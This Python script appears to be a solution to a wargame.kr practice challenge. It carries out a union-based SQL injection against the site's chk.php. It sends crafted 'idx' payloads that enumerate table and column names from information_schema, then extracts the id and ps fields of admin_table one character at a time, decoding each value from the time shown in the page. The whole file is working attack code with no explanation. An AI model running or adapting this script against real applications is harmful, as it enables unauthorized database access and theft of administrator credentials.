# _*_ coding : UTF-8 _*_
import requests
import sys
url = 'http://wargame.kr:8080/ip_log_table/chk.php'
idx = 18567


# date number -> ascii number converter
def res(resultHtml):
    resultHtml = resultHtml.split(" ")[-1].replace("</b>", "")
    result = int(resultHtml.split(":")[-1]) + int(resultHtml.split(":")[-2]) * 60
    return result


# Configure the number of tables
payload = str(idx) + " union select (select count(*) from information_schema.tables) limit 1,1#"
data = {'idx': payload}
r = requests.post(url, data=data)
tableCount = res(r.text)
print("The number of tables : " + str(tableCount))

# Pop tables
for i in range(0, tableCount):
    payload = str(idx) + " union select length((select TABLE_NAME from information_schema.tables limit %d, 1)) limit 1,1#" % (i)
    data = {'idx': payload}
    r = requests.post(url, data=data)
    tableLength = res(r.text)

    print("%2d : " % (i+1), end="")
    sys.stdout.flush()
    for j in range(1, tableLength+1):
        payload = str(idx) + " union select ascii(substr((select TABLE_NAME from information_schema.tables limit %d,1),%d,1)) limit 1,1#" % (i, j)
        data = {'idx': payload}
        r = requests.post(url, data=data)
        tmpTableName = res(r.text)

        print(chr(tmpTableName), end='')
        sys.stdout.flush()
    print()


# Configure the number of columns of admin_tabl
payload = "1 union select (select count(*) from information_schema.columns where ascii(table_name)=97) limit 0,1"
data = {'idx': payload}
r = requests.post(url, data=data)
columnCount = res(r.text)
print("The number of columns of 'admin_table' : "+str(columnCount))

# Pop the name of columns in admin_table
for i in range(0, columnCount):
    payload = "1 union select length((select column_name from information_schema.columns where ascii(table_name)=97 limit %d,1)) limit 0,1" % i
    data = {'idx': payload}
    r = requests.post(url, data=data)
    columnLength = res(r.text)

    print("%d : " % (i + 1), end="")
    for j in range(1, columnLength+1):
        payload = "1 union select ascii(substr((select column_name from information_schema.columns where ascii(table_name)=97 limit %d,1),%d,1)) limit 0,1" % (i, j)
        data = {'idx': payload}
        r = requests.post(url, data=data)
        tmpColumnName = res(r.text)
        print(chr(tmpColumnName), end='')
        sys.stdout.flush()
    print()


# Configure the number of rows of table 'admin_table'
payload = "1 union select count(*) from admin_table limit 0,1"
data = {'idx': payload}
r = requests.post(url, data=data)
rowCount = res(r.text)
print("\nThe number of rows of 'admin_table' : "+str(rowCount))

# Pop informations of admin_table
print("Picking up the data of column 'idx'")
for i in range(0, rowCount):
    payload = str(idx) + " union select length((select id from admin_table limit %d, 1)) limit 1,1#" % (i)
    data = {'idx': payload}
    r = requests.post(url, data=data)
    tableLength = res(r.text)

    print("%2d : " % (i+1), end="")
    sys.stdout.flush()
    for j in range(1, tableLength+1):
        payload = str(idx) + " union select ascii(substr((select id from admin_table limit %d,1),%d,1)) limit 1,1#" % (i, j)
        data = {'idx': payload}
        r = requests.post(url, data=data)
        tmpRowName = res(r.text)

        print(chr(tmpRowName), end='')
        sys.stdout.flush()
    print()

print("Picking up the data of column 'id'")
for i in range(0, rowCount):
    payload = str(idx) + " union select length((select idx from admin_table limit %d, 1)) limit 1,1#" % (i)
    data = {'idx': payload}
    r = requests.post(url, data=data)
    tableLength = res(r.text)

    print("%2d : " % (i+1), end="")
    sys.stdout.flush()
    for j in range(1, tableLength+1):
        payload = str(idx) + " union select ascii(substr((select idx from admin_table limit %d,1),%d,1)) limit 1,1#" % (i, j)
        data = {'idx': payload}
        r = requests.post(url, data=data)
        tmpRowName = res(r.text)

        print(chr(tmpRowName), end='')
        sys.stdout.flush()
    print()

print("Picking up the data of column 'ps'")
for i in range(0, rowCount):
    payload = str(idx) + " union select length((select ps from admin_table limit %d, 1)) limit 1,1#" % (i)
    data = {'idx': payload}
    r = requests.post(url, data=data)
    tableLength = res(r.text)

    print("%2d : " % (i+1), end="")
    sys.stdout.flush()
    for j in range(1, tableLength+1):
        payload = str(idx) + " union select ascii(substr((select ps from admin_table limit %d,1),%d,1)) limit 1,1#" % (i, j)
        data = {'idx': payload}
        r = requests.post(url, data=data)
        tmpRowName = res(r.text)

        print(chr(tmpRowName), end='')
        sys.stdout.flush()
    print()
